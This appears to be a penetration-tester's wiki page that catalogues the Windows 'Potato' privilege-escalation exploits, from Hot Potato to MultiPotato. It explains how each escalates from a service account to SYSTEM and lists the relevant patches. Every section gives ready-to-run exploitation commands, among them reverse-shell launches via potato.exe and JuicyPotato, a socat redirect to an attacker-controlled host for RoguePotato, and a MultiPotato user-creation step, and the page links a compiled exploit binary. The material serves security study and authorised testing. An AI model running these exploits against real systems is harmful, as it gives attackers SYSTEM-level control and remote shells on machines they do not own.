# Potatos

![](<../../../.gitbook/assets/image (48).png>)

Hot, Rotten, Lonely, Juicy, Rogue, Sweet, Generic potatoes. There are a lot of different potatoes used to escalate privileges from Windows Service Accounts to NT AUTHORITY/SYSTEM. But, what are the differences? When should I use each one? Do they still work? This post is a summary of each kind of potato, when to use it and how to achieve successful exploitation.

{% hint style="success" %}
if you're a lazy ass like me:&#x20;

* Use Sweet Potato to rule them all - [Sweet Potato](potatos.md#sweet-potato)

If you do not want to use Sweet Potato:

* If the machine is >= Windows 10 1809 & Windows Server 2019 - Try [Rogue Potato](potatos.md#rogue-potato)
* If the machine is < Windows 10 1809 < Windows Server 2019 - Try [Juicy Potato](potatos.md#juicy-potato)
{% endhint %}

## <mark style="color:red;">Hot Potato</mark>

**Hot Potato** was the first potato and was the code name of a Windows privilege escalation technique discovered by Stephen Breen [@breenmachine](https://twitter.com/breenmachine). This vulnerability affects Windows 7, 8, 10, Server 2008, and Server 2012.

![](<../../../.gitbook/assets/image (70).png>)

Therefore, the vulnerability uses the following:

* **1.** Local NBNS Spoofer: To impersonate the name resolution and force the system to download a malicious WAPD configuration.
* **2.** Fake WPAD Proxy Server: Deploys a malicios WAPD configuration to force the system to perform a NTLM authentication
* **3.** HTTP -> SMB NTLM Relay: Relays the WAPD NTLM token to the SMB service to create an elevated process.

To understand deeper this technique, the researchers post/video are recommended:

* [https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)
* [https://www.youtube.com/watch?v=8Wjs\_\_mWOKI](https://www.youtube.com/watch?v=8Wjs\_\_mWOKI)

### <mark style="color:orange;">Exploitation</mark>

The exploit can be found here:

{% embed url="https://github.com/Kevin-Robertson/Tater" %}

and here is the compiled binary exploit:

{% file src="../../../.gitbook/assets/potato.exe" %}

Run the exploit with your custom reverse shell:

```
potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" - enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

Wait for a Windows Defender update, or trigger one manually.

Unfortunately, multiple problems have been found with service accounts, making them easier to escalate privileges with.

{% hint style="info" %}
Microsoft patched this (MS16-075) by disallowing same-protocol NTLM authentication using a challenge that is already in flight. What this means is that **SMB->SMB NTLM relay from one host back to itself will no longer work**. MS16-077 WPAD Name Resolution will not use NetBIOS (CVE-2016-3213) and does not send credential when requesting the PAC file(CVE-2016-3236). **WAPD MITM Attack is patched.**
{% endhint %}

## <mark style="color:red;">Rotten Potato</mark>



**Rotten Potato** is quite complex, but mainly it uses 3 things:

* **1.** _RPC_ that is running through _NT AUTHORITY/SYSTEM_ that is going to try to authenticate to our local proxy through the _CoGetInstanceFromIStorage_ API Call.
* **2.** _RPC_ in port 135 that is going to be used to reply all the request that the first _RPC_ is performing. It is going to act as a template.
* **3.** _AcceptSecurityContext_ API call to locally impersonate _NT AUTHORITY/SYSTEM_

![](<../../../.gitbook/assets/image (84).png>)

* **1.** Trick RPC to authenticate to the proxy with the _CoGetInstanceFromIStorage_ API call. In this call the proxy IP/Por t is specified.
* **2.** RPC send a _NTLM Negotiate_ package to the proxy.
* **3.** The proxy **relies** the _NTLM Negotiate_ to RPC in port 135, to be used as a template. At the same time, a call to _AcceptSecurityContext_ is performed to force a local authentication. Notice that this package is modified to force the local authentication.
* **4. & 5.** _RPC 135_ and _AcceptSecurityContext_ replies with a _NTLM Challenge_ . The content of both packets are mixed to match a local negotiation and is forwarded to the _RPC_, step **6.**.
* **7.** _RPC_ responds with a _NLTM Auth_ package that is send to _AcceptSecurityContext_ (**8.**) and the **impersonation** is performed (**9.**).



To understand deeper this technique, the researchers post/video are recommended:

* [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [https://www.youtube.com/watch?v=8Wjs\_\_mWOKI](https://www.youtube.com/watch?v=8Wjs\_\_mWOKI)

### <mark style="color:orange;">Exploitation</mark>

Download the binary from the repository: [Here](https://github.com/breenmachine/RottenPotatoNG)

After having a _meterpreter_ shell with _incognito mode_ loaded:

```
MSFRottenPotato.exe t c:\windows\temp\test.bat
```

{% hint style="info" %}
Decoder analyzed if this technique could be exploited in the latest Windows version, in this blog post: [https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/](https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/)

To sum up:

* DCOM does not talk to our local listeners, so no MITM and no exploit.
* Sending the packets to a host under our control listening on port 135, and then forward the data to our local COM listener does not work. The problem is that in this case, the client will not negotiate a Local Authentication.

Therefore, this technique won’t work on versions >= Windows 10 1809 & Windows Server 2019
{% endhint %}

## <mark style="color:red;">Juicy Potato</mark> <a href="#juicy-potato" id="juicy-potato"></a>

**Juicy Potato** is Rotten Potato on steroids. It allows a more flexible way to exploit the vulnerability. In this case, [ohpe & decoder](http://ohpe.it/juicy-potato/) during a Windows build review found a setup where **BITS** was intentionally disabled and port **6666** was taken, therefore **Rotten Potato** PoC won’t work.

**What are BITS and CLSID?**

* **CLSID** is a globally unique identifier that identifies a COM class object. It is an _identifier_ like _UUID_.
* **Background Intelligent Transfer Service (BITS)** is used by programmers and system administrators to download files from or upload files to HTTP web servers and SMB file shares. The point is that _BITs_ implements the _IMarshal_ interface and allows the proxy declaration to force the NTLM Authentication.

**Rotten Potato**’s PoC used BITS with a default CLSID

{% embed url="https://github.com/ohpe/juicy-potato" %}



They discovered that other than BITS there are several out of process COM servers identified by specific CLSIDs that could be abused. They need al least to:

* Be instantiable by the current user, normally a _service user_ which has impersonation privileges
* Implement the _IMarshal_ interface
* Run as an elevated user (_SYSTEM_, _Administrator_, …)

And they found a lot of them: [http://ohpe.it/juicy-potato/CLSID/](http://ohpe.it/juicy-potato/CLSID/)

**What are the advantages?**

* We do not need to have a meterpreter shell
* We can specify our COM server listen port
* We can specify with CLSID to abuse

{% hint style="warning" %}
These steps are for Windows 7, newer versions of windows 10 is not vulnerable
{% endhint %}

Copy PSExec64.exe and the JuicyPotato.exe exploit executable over to Windows and start a listener.

Using an administrator command prompt, use PSExec64.exe to trigger a reverse shell running as the Local Service service account:

```powershell
PSExec64.exe -i -u "ntauthority\local service" reverse.exe
```

Start another listener on Kali

Now run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:

```
PrivEsc\JuicyPotato.exe -l 1337 -p reverse.exe  -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

{% hint style="info" %}
If the CLSID ({03ca...) doesn’t work for you, either check this list:

[https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

or run the GetCLSID.ps1 PowerShell script.
{% endhint %}

## <mark style="color:red;">Rogue Potato</mark> <a href="#rogue-potato" id="rogue-potato"></a>



After reading fixes regarding **Rotten/Juicy potato**, the following conclusions can be drawn:

* You cannot specify a custom port for OXID resolver address in latest Windows versions
* If you redirect the OXID resolution requests to a remote server on port 135 under your control and the forward the request to your local Fake RPC server, you will obtain only an ANONYMOUS LOGON.
* If you resolve the OXID Resolution request to a fake RPC Server, you will obtain an identification token during the _IRemUnkown2_ interface query.

![](<../../../.gitbook/assets/image (322).png>)

* **Rogue Potato** instruct the DCOM server to perform a **remote OXID query** by specifying a remote IP (Attacker IP)
* On the remote IP, setup a “socat” listener for redirecting the OXID resolutions requests to a fake **OXID RPC Server**
* The fake **OXID RPC server** implements the _ResolveOxid2_ server procedure, which will point to a controlled _Named Pipe_ \[_ncacn\_np:localhost/pipe/roguepotato\[\pipe\epmapper]_].
* The DCOM server will connect to the RPC server in order to perform the _IRemUnkown2_ interface call. By connecting to the _Named Pipe_, an “Autentication Callback” will be performed and we could impersonate the caller via RpcImpersonateClient() call.
* Then, a **token stealer** will:
  * Get the PID of the _rpcss_ service
  * Open the process, list all handles and for each handle try to duplicate it and get the handle type
  * If handle type is “Token” and token owner is SYSTEM, try to impersonate and launch a process with _CreatProcessAsUser()_ or _CreateProcessWithToken()_

To dig deeper read the author’s blog post: [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

**What do you need to make it work?**

* You need to have a machine under your control where you can perform the redirect and this machine must be accessible on **port 135** by the victim
* Upload both exe files from the [PoC](https://github.com/antonioCoco/RoguePotato). In fact it is also possible to launch the fake OXID Resolver in standalone mode on a Windows machine under our control when the victim’s firewall won’t accept incoming connections.

More info: [https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html](https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html)

### <mark style="color:orange;">**Exploitation**</mark>

Download the binary from the repository: [Here](https://github.com/antonioCoco/RoguePotato)

Run in your machine the _socat_ redirection (replace `VICTIM_IP`):

```
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
```

Execute PoC (replace YOUR\_IP and command):

```
.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
```

## <mark style="color:red;">Sweet Potato</mark>

**Sweet Potato** is a collection of various native Windows privilege escalation techniques from service accounts to SYSTEM. It has been created by [@_EthicalChaos_](https://twitter.com/\_EthicalChaos\_) and includes:

* **RottenPotato**
* **Weaponized JuciyPotato** with BITS WinRM discovery
* **PrintSpoofer** discovery and original exploit
* **EfsRpc** built on EfsPotato
* **PetitPotam**

It is the definitelly potatoe, a potatoe to rule them all.

### <mark style="color:orange;">**Exploitation**</mark>

Download the binary from the repository: [Here](https://github.com/CCob/SweetPotato)

```
./SweetPotato.exe

  -c, --clsid=VALUE          CLSID (default BITS:
                               4991D34B-80A1-4291-83B6-3328366B9097)
  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode
                               [DCOM|WinRM|EfsRpc|PrintSpoofer(default)]
  -l, --listenPort=VALUE     COM server listen port (default 6666)
  -h, --help                 Display this help
```

## <mark style="color:red;">Generic Potato</mark>

**Generic Potato** is a modified version of SweetPotato by [@micahvandeusen](https://twitter.com/micahvandeusen) to support impersonating authentication over HTTP and/or named pipes.

This allows for local privilege escalation from SSRF and/or file writes. It is handy when:

* The user we have access to has **SeImpersonatePrivilege**
* The system doesn’t have the print service running which prevents **SweetPotato**.
* WinRM is running preventing RogueWinRM
* You don’t have outbound RPC allowed to any machine you control and the BITS service is disabled preventing **RoguePotato**.

How do we abuse this? All we need is to cause an application or user with higher privileges to authenticate to us over HTTP or write to our named pipe. GenericPotato will steal the token and run a command for us as the user running the web server, probably system. More information ca be found [here](https://micahvandeusen.com/the-power-of-seimpersonation/)

### <mark style="color:orange;">**Exploitation**</mark>

Download the binary from the repository: [Here](https://github.com/micahvandeusen/GenericPotato)

```
.\GenericPotato.exe

  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -e, --exploit=VALUE        Exploit mode [HTTP|NamedPipe(default)]
  -l, --port=VALUE           HTTP port to listen on (default 8888)
  -i, --host=VALUE           HTTP host to listen on (default 127.0.0.1)
  -h, --help                 Display this help
```

## <mark style="color:red;">MultiPotato</mark>

This is just another Potato to get SYSTEM via SeImpersonate privileges. But this one is different in terms of:

* It doesn't contain any SYSTEM auth trigger for weaponization. Instead the code can be used to integrate your favorite trigger by yourself.
* It's not only using `CreateProcessWithTokenW` to spawn a new process. Instead you can choose between `CreateProcessWithTokenW`, `CreateProcessAsUserW`, `CreateUser` and `BindShell`.

So this project is able to open up a NamedPipe Server, impersonates any user connecting to it and afterwards does one of the options mentioned above. If any new SYSTEM auth triggers are published in the future this tool can still be used to elevate privileges - you just need to use another Pipe-Name in this case.

{% embed url="https://github.com/S3cur3Th1sSh1t/MultiPotato" %}

Examples:

1. CreateUser with modified PetitPotam trigger:

```
c:\temp\MultiPotato> MultiPotato.exe -t CreateUser
```

You have by default value 60 secconds (changable via [THEAD\_TIMEOUT](https://github.com/S3cur3Th1sSh1t/MultiPotato/blob/main/Multipotato/common.h)) to let the SYSTEM account or any other account authenticate. This can be done for example via an unpatched MS-EFSRPC function. By default MultiPotato listens on the pipename `\\.\pipe\pwned/pipe/srvsvc` which is meant to be used in combination with MS-EFSRPC. For other SYSTEM auth triggers you can adjust this value via the `-p` parameter.

```
c:\temp\MultiPotato> PetitPotamModified.exe localhost/pipe/pwned localhost
```
